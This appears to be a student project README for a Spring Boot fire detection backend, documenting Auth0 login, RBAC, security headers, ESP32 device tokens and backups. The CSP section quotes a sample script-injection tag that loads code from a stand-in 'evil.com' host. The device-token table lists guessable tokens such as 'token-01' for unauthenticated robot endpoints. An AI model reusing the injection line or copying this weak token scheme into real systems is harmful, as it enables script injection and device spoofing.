# Fire Detection System - Backend

This is the Spring Boot backend for the Fire Detection System. It manages user authentication, device communication, and stores fire event data in a PostgreSQL database.

## Prerequisites

To run this project locally, you need the following:

1.  **Java JDK 21**: [Download and install JDK 21](https://adoptium.net/temurin/releases/?version=21).
2.  **Apache Maven**: [Download and install Maven](https://maven.apache.org/download.cgi).
3.  **PostgreSQL**: A running PostgreSQL instance (Local installation or Docker).

## Local Database Setup

The project is configured to use a native PostgreSQL database by default for local development.

1.  Create a database named: `it-integration-project-local-test`
2.  Configure your credentials in `src/main/resources/application-dev.properties`:
    * Set `spring.datasource.password` to your local PostgreSQL password.

## Running the Application

1.  **Build the project**:

    ```bash
    mvn clean install -DskipTests
    ```

2.  **Run with the Dev profile**:
    Use the provided batch script for convenience:
    ```bash
    .\run-dev.bat
    ```
    Or use the Maven command:
    ```bash
    mvn spring-boot:run "-Dspring-boot.run.profiles=dev"
    ```

The API will be available at `http://localhost:8080`.

## Frontend Environment Setup

The frontend needs a `.env` file with Auth0 credentials. A template is provided:

```bash
cp .env.example .env
```

The `.env` file contains:
```
REACT_APP_AUTH0_DOMAIN=dev-pt13ynuua1vt84mg.eu.auth0.com
REACT_APP_AUTH0_CLIENT_ID=BMGSnGs65SxxoIwhckuobvRru9R8ePi5
REACT_APP_AUTH0_AUDIENCE=https://dev-pt13ynuua1vt84mg.eu.auth0.com/api/v2/
REACT_APP_API_URL=http://localhost:8080
```

For OKD deployment, change `REACT_APP_API_URL` to `https://backend-en-05-itip-en-05.apps.okd.ucll.cloud`.

## API Endpoints

| Method | Endpoint | Auth Required | Description |
|:---|:---|:---|:---|
| GET | `/v1/health` | No | Health check |
| GET | `/v1/status` | No | Robot status |
| GET | `/v1/events` | Yes (any role) | Get all fire events |
| POST | `/v1/events` | No (device token) | Store a fire event from ESP32 |
| POST | `/v1/telemetry` | No (device token) | Store sensor data from ESP32 |
| POST | `/v1/robot/heartbeat` | No (device token) | Robot heartbeat |
| POST | `/v1/command` | Yes (ADMIN only) | Send command to robot |
| GET | `/v1/auth/me` | Yes (any role) | Get current user info from JWT |

---

## Security Implementation

This project implements 13 security features across three stories: **SEC-01** (TLS/HTTPS), **SEC-02** (RBAC & MFA), and **SEC-03** (Security Headers). All security configuration is centralized in `SecurityConfig.java`.

### Requirements Covered

| Req ID | Requirement | Points |
|:---|:---|:---|
| **SD-20** | Implement user authentication and authorisation using OAuth2 / OpenID Connect via an identity provider (Auth0) | 8 |
| **SEC-01** | Implement role-based access control (RBAC) and demonstrate that it is enforced at the API level | 5 |
| **SEC-02** | Implement multi-factor authentication (MFA) for user accounts | 5 |
| **SEC-03** | Manage application secrets using environment-based approach with no hardcoded credentials anywhere in the codebase | 3 |
| **SEC-08** | Implement and enforce HTTPS with correct TLS configuration and certificate management | 3 |
| **SEC-10** | Implement security headers (CSP, HSTS, X-Frame-Options, etc.) and verify with a scanning tool | 3 |

---

### 1. OAuth2 / OpenID Connect Authentication (SEC-02)

Users authenticate through **Auth0**, an external identity provider, using the OAuth2 / OpenID Connect protocol. The backend does not handle login directly. Instead, the login flow works as follows:

1. The user clicks "Sign In" on the frontend.
2. The frontend redirects the user to Auth0's hosted login page.
3. The user enters their email and password on Auth0's page.
4. Auth0 verifies the credentials and issues a **JWT (JSON Web Token)**.
5. The frontend receives the JWT and includes it in the `Authorization` header of every API request.
6. The backend validates the JWT signature using Auth0's public key and extracts the user's identity and role.

The backend never sees or stores user passwords. Auth0 manages all credential storage, brute force protection, and account lockout.

**Configuration** (`application.properties`):
```properties
spring.security.oauth2.resourceserver.jwt.issuer-uri=https://dev-pt13ynuua1vt84mg.eu.auth0.com/
spring.security.oauth2.resourceserver.jwt.audiences=https://dev-pt13ynuua1vt84mg.eu.auth0.com/api/v2/
```

**Relevant file:** `SecurityConfig.java` — the `oauth2ResourceServer` configuration validates incoming JWTs.

---

### 2. JWT (JSON Web Token) Authentication (SEC-02)

Every authenticated request carries a JWT in the `Authorization: Bearer <token>` header. A JWT is a signed token containing three parts:

- **Header** — the signing algorithm (RS256)
- **Payload** — user info (email, name, roles, expiration time)
- **Signature** — cryptographic proof that the token was issued by Auth0

The backend verifies the signature using Auth0's public key, which it fetches once and caches from Auth0's JWKS (JSON Web Key Set) endpoint. If the signature is invalid or the token is expired, the request is rejected with `401 Unauthorized`.

The backend does not contact Auth0 on every request. Signature verification is done locally, so even if Auth0 is temporarily unavailable, existing tokens continue to work until they expire.

**Relevant file:** `SecurityConfig.java` — `jwtAuthenticationConverter()` extracts roles from the JWT claims.

---

### 3. Multi-Factor Authentication — MFA (SEC-02)

MFA is enforced for all accounts through Auth0's dashboard. After entering their password, every user must verify their identity with a second factor:

- **TOTP (Time-based One-Time Password)** — apps like Google Authenticator or Microsoft Authenticator generate a 6-digit code that changes every 30 seconds.
- **Email OTP** — Auth0 sends a one-time verification code to the user's registered email address.

MFA is configured entirely in Auth0's dashboard under **Security > Multi-Factor Auth**. No backend code changes were needed — Auth0 enforces it before issuing the JWT.

This is important for a fire detection system because unauthorized access could lead to missed fire alerts or false commands sent to the robot.

---

### 4. Role-Based Access Control — RBAC (SEC-02)

The system has two roles with different permission levels:

| Role | Dashboard | Event Logs | Robot Commands |
|:---|:---|:---|:---|
| **ADMIN** | View | View | Full access |
| **VIEWER** | View | View | No access |

Roles are assigned to users in Auth0's dashboard. A **Post Login Action** (a JavaScript function that runs after every successful login in Auth0) injects the user's role into the JWT as a custom claim:

```
Claim: "https://en05.ucll.be/roles"
Value: ["ADMIN"] or ["VIEWER"]
```

The backend reads this claim from the JWT in `SecurityConfig.java`:

```java
List<String> roles = jwt.getClaimAsStringList("https://en05.ucll.be/roles");
```

Endpoint-level enforcement:
- `POST /v1/command` requires `ADMIN` role — configured in the security filter chain with `.requestMatchers("/v1/command").hasRole("ADMIN")`
- `CommandController.java` also uses `@PreAuthorize("hasRole('ADMIN')")` as a second layer of protection
- All other protected endpoints require any authenticated user (any role)

The frontend also reads the role from the JWT and hides the robot control buttons for VIEWER users. However, this is only a UI convenience — the real enforcement is on the backend. Even if a VIEWER bypasses the frontend and sends a direct `POST /v1/command` request, the backend returns `403 Forbidden`.

**Relevant files:** `SecurityConfig.java`, `CommandController.java`, `App.tsx`

---

### 5. Content Security Policy — CSP (SEC-03)

CSP is an HTTP response header that tells the browser exactly which external sources are trusted. The browser will block any resource (script, stylesheet, API call, font, image) that comes from a source not listed in the policy.

Our CSP policy:

| Directive | Allowed Sources | Purpose |
|:---|:---|:---|
| `default-src` | `'self'` | Only load resources from our own domain by default |
| `script-src` | `'self' 'unsafe-inline'` | Scripts only from our domain. `unsafe-inline` is needed for React. |
| `style-src` | `'self' 'unsafe-inline' https://fonts.googleapis.com` | Styles from our domain and Google Fonts |
| `connect-src` | `'self'` + OKD backend URL + Auth0 domain | API calls only to our backend and Auth0 (for token exchange) |
| `font-src` | `'self' https://fonts.gstatic.com` | Font files from our domain and Google Fonts CDN |
| `img-src` | `'self' data:` | Images from our domain and inline data URIs |
| `object-src` | `'none'` | Block all plugins (Flash, Java applets) |
| `frame-ancestors` | `'none'` | Prevent our site from being embedded in iframes |

CSP prevents **Cross-Site Scripting (XSS)** attacks. If an attacker manages to inject a `<script src="https://evil.com/malware.js">` tag into the page, the browser will block it because `evil.com` is not in the `script-src` whitelist.

**Relevant file:** `SecurityConfig.java` — `contentSecurityPolicy()` in both filter chains.

---

### 6. HTTP Strict Transport Security — HSTS (SEC-03)

HSTS is an HTTP response header that instructs the browser to only communicate with the server over HTTPS. Once the browser sees this header, it will automatically convert any `http://` request to `https://` for the specified duration.

Our configuration:
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

- `max-age=31536000` — remember this rule for 1 year (31,536,000 seconds)
- `includeSubDomains` — apply the rule to all subdomains as well
- `preload` — allow the domain to be included in browser preload lists, so HTTPS is enforced even on the very first visit

HSTS prevents **protocol downgrade attacks**. Without it, an attacker on the same network (e.g., public WiFi) could intercept the initial HTTP request before the redirect to HTTPS, and perform a man-in-the-middle attack.

**Relevant file:** `SecurityConfig.java` — `httpStrictTransportSecurity()` configuration.

---

### 7. X-Frame-Options (SEC-03)

This header prevents the application from being loaded inside an `<iframe>` on another website.

```
X-Frame-Options: DENY
```

This protects against **clickjacking** attacks. In a clickjacking attack, a malicious website loads our application in a transparent iframe and overlays it with fake UI elements. The user thinks they are clicking on the attacker's page, but they are actually clicking buttons on our application (for example, sending a command to the fire robot).

Setting this to `DENY` means our application cannot be embedded in any iframe, on any website, including our own.

**Relevant file:** `SecurityConfig.java` — `frameOptions(frame -> frame.deny())`.

---

### 8. CORS — Cross-Origin Resource Sharing (SEC-03)

CORS controls which websites are allowed to make API requests to our backend. Without CORS, any website on the internet could call our API endpoints from the user's browser.

Our configuration allows:
- **Methods:** GET, POST, PUT, DELETE, OPTIONS, HEAD
- **Headers:** Authorization, Content-Type, X-Device-ID, Cache-Control
- **Credentials:** Allowed (needed for sending the JWT in the Authorization header)

The browser enforces CORS by sending a preflight `OPTIONS` request before the actual request. The backend responds with the allowed origins, and the browser only proceeds if the origin is permitted.

**Relevant file:** `SecurityConfig.java` — `corsConfigurationSource()` bean.

---

### 9. Stateless Sessions (SEC-03)

The backend does not create or store any server-side sessions. Every request is independently authenticated by validating the JWT token.

```java
.sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
```

In a traditional session-based system, the server stores session data in memory and sends a session ID cookie to the browser. This creates problems:
- If the server restarts, all sessions are lost and users are logged out
- With multiple server instances (load balancing), sessions need to be shared
- Session IDs can be hijacked

With stateless JWT authentication:
- The server stores nothing — the JWT itself contains all user information
- The backend can be restarted without affecting logged-in users
- Multiple backend instances can independently verify the same JWT
- No session hijacking is possible because there are no sessions

**Relevant file:** `SecurityConfig.java` — `sessionManagement()` configuration.

---

### 10. CSRF Protection (SEC-03)

CSRF (Cross-Site Request Forgery) protection is intentionally **disabled**:

```java
.csrf(AbstractHttpConfigurer::disable)
```

CSRF attacks work by tricking a user's browser into sending a request with their session cookie to our backend. Since we use **stateless JWT authentication** instead of cookies, CSRF attacks are not applicable. The JWT is sent in the `Authorization` header, which a malicious website cannot set on a cross-origin request (this is prevented by CORS).

Disabling CSRF is the standard approach for stateless REST APIs that use bearer token authentication.

**Relevant file:** `SecurityConfig.java`.

---

### 11. TLS / HTTPS (SEC-01)

All communication between the browser and the backend is encrypted using TLS (Transport Layer Security). TLS ensures that data in transit — including JWT tokens, fire alerts, and sensor data — cannot be read or modified by anyone intercepting the network traffic.

TLS is handled at the infrastructure level:
- **OKD (OpenShift)** terminates TLS at the route level using a platform-managed certificate
- The backend runs on HTTP internally (port 8080), and the OKD route wraps it in HTTPS
- The application is accessible only via `https://backend-en-05-itip-en-05.apps.okd.ucll.cloud`
- Combined with HSTS, browsers are forced to always use HTTPS

No application-level TLS configuration is needed because OKD handles certificate management and TLS termination automatically.

---

### 12. Password Hashing — BCrypt (SEC-02)

User passwords in the database are hashed using the **BCrypt** algorithm. BCrypt is a one-way hashing function, meaning the original password cannot be recovered from the hash.

```java
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}
```

How BCrypt works:
- The password `admin123` is transformed into a hash like `$2a$10$X7g8kQ9v...` (60 characters)
- A random **salt** is generated and embedded in the hash for each password. This means two users with the same password will have different hashes.
- BCrypt has a configurable **cost factor** (default: 10). Each increment doubles the computation time, making brute force attacks increasingly impractical.
- Unlike fast algorithms like SHA-256 (billions of guesses per second), BCrypt is intentionally slow (~100ms per hash), which makes it suitable for password storage.

Even though Auth0 handles user login, BCrypt is still used for the initial seed data in `DbInitializer.java`.

**Relevant file:** `SecurityConfig.java` — `passwordEncoder()` bean.

---

### 13. Device Authentication (SEC-02)

ESP32 devices (the fire robots) authenticate using a different mechanism than users. Since IoT devices have no browser and no user interaction, they cannot perform OAuth2 login. Instead, they use simple **device tokens**.

Each device is registered in the `devices` table with a unique ID and token:

| Device ID | Token | Description |
|:---|:---|:---|
| ESP32-01 | token-01 | Front Lobby Robot |
| ESP32-02 | token-02 | Server Room Robot |
| ESP32-03 | token-03 | Warehouse Robot |
| ESP32-04 | token-04 | Kitchen Robot |

When an ESP32 sends data, it includes the token and device ID in the HTTP headers:
```
Authorization: Bearer token-01
X-Device-ID: ESP32-01
```

Device endpoints (`/v1/events`, `/v1/telemetry`, `/v1/robot/heartbeat`) are in a separate security filter chain (`robotFilterChain`, `@Order(1)`) that does not require JWT authentication. This filter chain is matched before the main security filter chain, so these endpoints are accessible without an Auth0 token.

**Relevant file:** `SecurityConfig.java` — `robotFilterChain()` with `@Order(1)`.

---

## Security Architecture Overview

```
                                           ┌─────────────────┐
                                           │    Auth0         │
                                           │  (Identity       │
                                           │   Provider)      │
                                           └────┬───────┬────┘
                                     login flow │       │ JWT issued
                                                │       │
┌──────────┐    HTTPS    ┌──────────┐    HTTPS   │  ┌────▼─────┐     SQL      ┌──────────┐
│  Browser │◄──────────►│ Frontend │◄────────────┘  │ Backend  │◄───────────►│PostgreSQL│
│          │   (TLS)    │ (React)  │   JWT in       │ (Spring) │  (encrypted)│          │
└──────────┘            └──────────┘   Auth header  └────▲─────┘             └──────────┘
                                                         │
                                              Device     │
                                              Token      │
┌──────────┐    HTTP POST                               │
│  ESP32   │────────────────────────────────────────────┘
│  Robot   │   Authorization: Bearer token-01
└──────────┘   X-Device-ID: ESP32-01
```

## File Reference

| Feature | File |
|:---|:---|
| JWT validation, RBAC, security headers, CORS | `SecurityConfig.java` |
| User info endpoint (`/v1/auth/me`) | `AuthController.java` |
| ADMIN-only command endpoint | `CommandController.java` |
| Auth0 JWT configuration | `application.properties` |
| Mock JWT decoder for tests | `TestSecurityConfig.java` |
| Password hashing for seed data | `DbInitializer.java` |
| Token column removal migration | `V9__drop_token_column.sql` |
| Frontend Auth0 provider setup | `index.tsx` |
| Frontend role-based rendering | `App.tsx` |
| Frontend login page | `LoginPage.tsx` |
| Auth0 credentials template | `.env.example` |

---

## Database Backup & Restore

### Automated Backup Strategy
A CronJob is configured to run every 6 hours on the OKD cluster. It performs a `pg_dump` of the PostgreSQL database and stores the backup files in a Persistent Volume with a 2-day retention policy.

- **Backup Schedule:** `0 */6 * * *`
- **Backup Location:** `/backups` (within the `database-backup-pvc`)
- **Naming Convention:** `backup-YYYY-MM-DDTHH-mm-ss.sql`

### Restore Procedure
To restore a backup, follow these steps:

1.  **Locate the backup file**: Identify the specific backup file you wish to restore from the `/backups` directory in the backup pod or PVC.
2.  **Restore to a database**:
    Use the `psql` utility to restore the SQL dump:
    ```bash
    cat backup-YYYY-MM-DDTHH-mm-ss.sql | psql -h ${DB_HOST} -U ${DB_USER} -d ${TARGET_DB_NAME}
    ```
    *Note: Ensure the target database exists before running the restore command.*

### Verification Procedure
To verify the integrity of a backup:
1.  **Count rows in the production database**:
    ```sql
    SELECT count(*) FROM fire_events;
    ```
2.  **Restore the backup to a test database**:
    Follow the restore procedure above, targeting a temporary test database.
3.  **Count rows in the test database**:
    ```sql
    SELECT count(*) FROM fire_events;
    ```
4.  **Compare**: Confirm that the row counts match between the original and the restored database.
